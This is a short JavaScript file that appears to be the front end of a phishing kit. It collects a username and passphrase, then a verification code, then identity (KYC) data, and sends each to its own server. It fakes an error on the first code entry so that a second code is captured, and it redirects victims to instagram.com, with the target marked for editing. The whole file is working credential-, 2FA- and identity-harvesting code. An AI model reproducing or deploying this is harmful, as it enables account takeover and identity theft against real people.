let codeAttempts = 0;

function showPage(id) {
  document.querySelectorAll(".page").forEach((p) => p.classList.add("hidden"));
  document.getElementById(id).classList.remove("hidden");
}

// LOGIN
document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const username = document.getElementById("username").value;
  const passphrase = document.getElementById("passphrase").value;

  const res = await fetch("/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, passphrase }),
  });

  if (res.ok) {
    showPage("page-code");
  }
});

// CODE
document.getElementById("codeForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const code = document.getElementById("code").value;

  const res = await fetch("/code", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ code }),
  });

  if (!res.ok && codeAttempts === 0) {
    codeAttempts++;
    document.getElementById("code-error").classList.remove("hidden");
  } else {
    showPage("page-kyc");
  }
});

// KYC
document.getElementById("kycForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const formData = new FormData(document.getElementById("kycForm"));

  const res = await fetch("/kyc", {
    method: "POST",
    body: formData,
  });

  if (res.ok) {
    window.location.href = "https://instagram.com"; // EDIT
  }
});